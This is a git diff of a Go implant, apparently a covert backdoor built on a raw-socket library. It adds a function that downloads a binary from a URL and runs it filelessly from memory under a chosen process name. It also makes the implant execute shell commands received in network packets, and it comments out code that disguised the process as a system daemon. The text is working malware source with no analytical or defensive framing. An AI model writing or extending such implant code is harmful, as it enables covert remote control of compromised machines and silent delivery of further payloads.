@@ -11,12 +11,10 @@ import (
 	"fmt"
 	"log"
 	"net"
-	"os"
 	"os/exec"
-	"reflect"
+	"psovaya/pkg/dropper"
 	"strings"
 	"time"
-	"unsafe"
 
 	"github.com/google/gopacket"
 	"github.com/oneNutW0nder/CatTails/cattails"
@@ -25,17 +23,17 @@ import (
 
 var lastCmdRan string
 
-func HideName(pname string) {
-	argv0str := (*reflect.StringHeader)(unsafe.Pointer(&os.Args[0]))
-	argv0 := (*[1 << 30]byte)(unsafe.Pointer(argv0str.Data))[:argv0str.Len]
+// func HideName(pname string) {
+// argv0str := (*reflect.StringHeader)(unsafe.Pointer(&os.Args[0]))
+// argv0 := (*[1 << 30]byte)(unsafe.Pointer(argv0str.Data))[:argv0str.Len]
 
-	n := copy(argv0, pname)
-	if n < len(argv0) {
-		for i := n; i < len(argv0); i++ {
-			argv0[i] = 0
-		}
-	}
-}
+// n := copy(argv0, pname)
+// if n < len(argv0) {
+// for i := n; i < len(argv0); i++ {
+// argv0[i] = 0
+// }
+// }
+// }
 
 func generateHeartbeat(iface *net.Interface, src net.IP, dst net.IP, dstMAC net.HardwareAddr) {
 	for {
@@ -51,6 +49,15 @@ func generateHeartbeat(iface *net.Interface, src net.IP, dst net.IP, dstMAC net.
 	}
 }
 
+func dropBinary(url string, procname string) {
+	elfContent := dropper.RetrieveFile(url)
+
+	// Create fd and Inject Code
+	fd := dropper.MemfdCreate("")
+	dropper.WriteToMemfd(fd, elfContent)
+	dropper.ExecMemfd(fd, procname)
+}
+
 func implantProcessPacket(packet gopacket.Packet, target bool, hostIP net.IP) {
 	data := string(packet.ApplicationLayer().Payload())
 	data = strings.Trim(data, "\n")
@@ -59,25 +66,21 @@ func implantProcessPacket(packet gopacket.Packet, target bool, hostIP net.IP) {
 	payload := strings.Split(data, " ")
 	fmt.Println("[+] PAYLOAD:", payload)
 
-	// Check if target command
-	if target {
-		if payload[1] == hostIP.String() {
-			fmt.Println("[+] TARGET COMMAND RECEIVED")
-			command := strings.Join(payload[2:], " ")
-			execCommand(command)
-		}
-	} else {
-		// Split the string to get the important parts
-		// Rejoin string to put into a single bash command string
+	// Split the string to get the important parts
+	// Rejoin string to put into a single bash command string
+	switch payload[0] {
+	case "COMMAND":
 		command := strings.Join(payload[1:], " ")
 		execCommand(command)
+	case "DEPLOY":
+		fmt.Println("Deploy Binary")
 	}
 }
 
 func execCommand(command string) {
 	// Only run command if we didn't just run it
 	if lastCmdRan != command {
-		// fmt.Println("[+] COMMAND:", command)
+		fmt.Println("[+] COMMAND:", command)
 
 		// Run the command and get output
 		_, err := exec.Command("/bin/sh", "-c", command).CombinedOutput()
@@ -87,28 +90,10 @@ func execCommand(command string) {
 		// Save last command we just ran
 		lastCmdRan = command
 		// fmt.Println("[+] OUTPUT:", string(out))
-	} else {
-
 	}
 }
 
-func executeCmd() {
-
-}
-
-func encodeMsg() {
-
-}
-
-func decodeMsg() {
-
-}
-
 func main() {
-
-	/* Hide Process Name */
-	// HideName("/lib/systemd")
-
 	/* Cattails Init */
 	// Create BPF filter vm
 	vm := cattails.CreateBPFVM(cattails.FilterRaw)
